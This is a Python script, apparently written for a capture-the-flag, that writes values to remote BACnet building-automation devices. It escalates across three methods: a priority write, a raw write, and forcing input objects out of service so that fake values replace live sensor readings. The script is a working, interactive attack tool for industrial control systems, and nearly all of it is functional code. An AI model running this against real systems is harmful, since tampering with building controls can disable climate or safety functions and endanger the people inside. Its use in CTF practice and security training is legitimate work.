# vibe coded a script to set values on remote devices via bacnet
# used for a ctf

import asyncio
import nest_asyncio
import BAC0
import time

# --- DEFAULT CONFIGURATION ---
DEFAULT_INTERFACE_IP = '10.0.128.207'
# -----------------------------

nest_asyncio.apply()
BAC0.log_level('silence')

def get_input(prompt_text, default=None):
    if default:
        user_input = input(f"{prompt_text} [{default}]: ").strip()
        return user_input if user_input else default
    else:
        return input(f"{prompt_text}: ").strip()

def attempt_write(bacnet, target_ip, obj_type, obj_inst, value, priority):
    """
    Tries 3 methods to write the value:
    1. Standard Commandable Write (Value @ Priority)
    2. Simple Write (Value only - for setpoints)
    3. Force Write (Out-Of-Service=True, then Value - for Inputs)
    """
    
    # --- METHOD 1: Standard Commandable Write ---
    # Used for Outputs and Commandable Values (e.g. Setpoints with priorities)
    cmd_string = f"{target_ip} {obj_type} {obj_inst} presentValue {value} - {priority}"
    print(f"  [Attempt 1] Writing with Priority {priority}...")
    try:
        bacnet.write(cmd_string)
        print("    -> Success!")
        return True
    except Exception as e:
        if "writeAccessDenied" not in str(e) and "unknownProperty" not in str(e):
            print(f"    -> Unexpected Error: {e}")
            return False
        print(f"    -> Failed: Target refused priority write.")

    # --- METHOD 2: Simple Write (No Priority) ---
    # Used for simple variables/constants that don't have a priority array
    if str(value).lower() != 'null': # Can't write 'null' to a simple object
        cmd_string_simple = f"{target_ip} {obj_type} {obj_inst} presentValue {value}"
        print(f"  [Attempt 2] Writing RAW value (No Priority)...")
        try:
            bacnet.write(cmd_string_simple)
            print("    -> Success! (Object is Non-Commandable)")
            return True
        except Exception as e:
            print(f"    -> Failed.")

    # --- METHOD 3: Force Input (Out of Service) ---
    # Used for Analog Inputs / Binary Inputs. We must "break" the sensor link first.
    if "input" in obj_type.lower():
        print(f"  [Attempt 3] Object is an Input. Attempting to set 'Out Of Service'...")
        try:
            # 1. Set OutOfService = True
            bacnet.write(f"{target_ip} {obj_type} {obj_inst} outOfService true")
            print("    -> 'Out of Service' Enabled.")
            
            # 2. Write the value
            bacnet.write(f"{target_ip} {obj_type} {obj_inst} presentValue {value}")
            print("    -> Value written successfully (Simulated).")
            print("    -> WARNING: This object is now offline from the physical sensor.")
            return True
        except Exception as e:
            print(f"    -> Failed to force input: {e}")

    return False

def main():
    print("--- Smart BACnet Write Utility ---")
    local_ip = get_input("Enter YOUR Interface IP", DEFAULT_INTERFACE_IP)
    
    # Event Loop Setup
    try:
        loop = asyncio.get_event_loop()
    except RuntimeError:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)

    try:
        bacnet = BAC0.lite(ip=local_ip)
    except Exception as e:
        print(f"Error binding to IP: {e}")
        return

    try:
        while True:
            print("\n" + "="*40)
            target_ip = get_input("Target IP")
            if not target_ip: break
            
            obj_type = get_input("Object (e.g. analogValue, analogInput)", "analogValue")
            obj_inst = get_input("Instance", "1")
            
            # Discovery Check
            bacnet.whois(target_ip)
            time.sleep(1)
            
            val_input = get_input("Value to Write (or 'null')")
            priority = get_input("Priority (1-16)", "8")

            # Parse Value
            final_value = val_input
            if val_input.lower() != 'null':
                try:
                    if '.' in val_input: final_value = float(val_input)
                    else: final_value = int(val_input)
                except: pass

            # EXECUTE SMART WRITE
            attempt_write(bacnet, target_ip, obj_type, obj_inst, final_value, priority)

            # Verification Read
            try:
                curr = bacnet.read(f"{target_ip} {obj_type} {obj_inst} presentValue")
                print(f"  [Verify] Current Value: {curr}")
            except: pass

            if get_input("Write another?", "n").lower() != 'y':
                break

    except KeyboardInterrupt:
        print("\nCancelled.")
    finally:
        bacnet.disconnect()

if __name__ == "__main__":
    main()

